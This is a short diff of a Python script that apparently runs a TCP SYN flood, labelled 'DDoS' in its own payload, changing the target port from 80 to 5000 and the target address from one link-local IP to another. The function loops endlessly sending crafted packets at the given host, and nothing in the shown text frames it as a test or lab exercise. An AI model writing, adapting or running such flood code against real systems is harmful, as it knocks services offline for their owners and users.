@@ -4,7 +4,7 @@ from rport import *
 import time
 ttl = 99
 id = 1111
-dport = 80
+dport = 5000
 message = b"DDoS"
 def TCP_SYN(ip):
 	while 1:
@@ -16,4 +16,4 @@ def TCP_SYN(ip):
 		#time.sleep(0.1)
 		#print(packet.show())
 
-TCP_SYN("169.254.7.233")
+TCP_SYN("169.254.75.164")
